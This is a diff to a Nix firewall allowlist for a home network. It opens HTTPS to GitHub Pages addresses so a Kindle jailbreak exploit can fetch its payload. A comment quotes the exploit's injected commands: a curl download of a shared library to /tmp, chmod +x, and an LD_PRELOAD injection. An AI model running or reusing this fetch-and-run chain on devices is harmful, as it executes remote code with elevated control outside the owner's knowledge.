@@ -164,6 +164,42 @@ let
     { src = kindleIP; dst = "78.24.205.144"; proto = "tcp"; port = 80;
       what = "sanctuary.skyvincent.com — FALLBACK, server down since 2026-11-01"; }
 
+    # ── What SpiderCat actually needs, read out of the payload ──────────────
+    # Not guessed. The .azw3 was unpacked on 2026-11-01 and the exploit's own
+    # code says exactly one external thing happens. After forging a libc
+    # pointer into system(), it injects a shell command through a fake
+    # XMLHttpRequest URL:
+    #
+    #   curl -o /tmp/jb.so 'https://kindlemodding.org/spidercat/jb.so'
+    #   chmod +x /tmp/jb.so
+    #   lipc-set-prop com.lab126.system updateWaveform 'LD_PRELOAD=/tmp/jb.so'
+    #
+    # That curl is the whole network requirement. Every other URL in the file
+    # is an XML namespace or the 127.0.0.1 injection vector. NO AMAZON HOST is
+    # involved, which is what makes this safe to open.
+    #
+    # kindlemodding.org is GitHub Pages: the four documented anycast addresses
+    # below, stable and not a rotating CDN. Resolved identically from 1.1.1.1,
+    # 9.9.9.9 and 8.8.8.8. Permitting them on 443 cannot reach anything else of
+    # consequence, because DNS on this segment is allowlist-only — no other
+    # GitHub Pages name resolves here.
+    #
+    # ⚠️ Why the device must ALSO believe it has internet (the block above):
+    # this curl runs on the Kindle, so it needs the radio up. On the first
+    # attempt the exploit ran fine and printed "executing", but the Kindle had
+    # already powered its Wi-Fi down over the failed connectivity check, so the
+    # fetch silently failed. "executing" is printed unconditionally inside a
+    # try/catch with no retry — it is the last line the script ever prints, so
+    # a stalled jailbreak looks exactly like a running one.
+    { src = kindleIP; dst = "185.199.108.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
+    { src = kindleIP; dst = "185.199.109.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
+    { src = kindleIP; dst = "185.199.110.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
+    { src = kindleIP; dst = "185.199.111.153"; proto = "tcp"; port = 443;
+      what = "kindlemodding.org (GitHub Pages) — fetches jb.so"; }
+
     # ── AP → UniFi controller ────────────────────────────────────────────────
     # The observation pass on 2026-11-01 found the AP reaches its controller
     # TWO different ways, which is why both logs were needed:
